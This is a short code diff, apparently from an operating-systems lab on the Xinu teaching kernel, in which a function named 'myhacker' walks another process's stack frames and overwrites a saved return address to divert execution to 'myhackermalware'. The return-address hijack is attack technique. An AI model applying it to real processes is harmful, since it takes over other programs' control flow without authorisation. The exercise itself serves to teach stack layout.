@@ -18,6 +18,12 @@ void myhacker(pid32 pid){
     fp = (unsigned long *)proc->prstkptr;
     fp += 2;
     fp = (unsigned long *) *fp;
+    fp = (unsigned long *) *fp;
+    fp = (unsigned long *) *fp;
+    fp = (unsigned long *) *fp;
+    fp = (unsigned long *) *fp;
+    fp = (unsigned long *) *fp;
+    fp = (unsigned long *) *fp;
     ret = fp + 1;
     *ret = (unsigned long *) myhackermalware;
 }
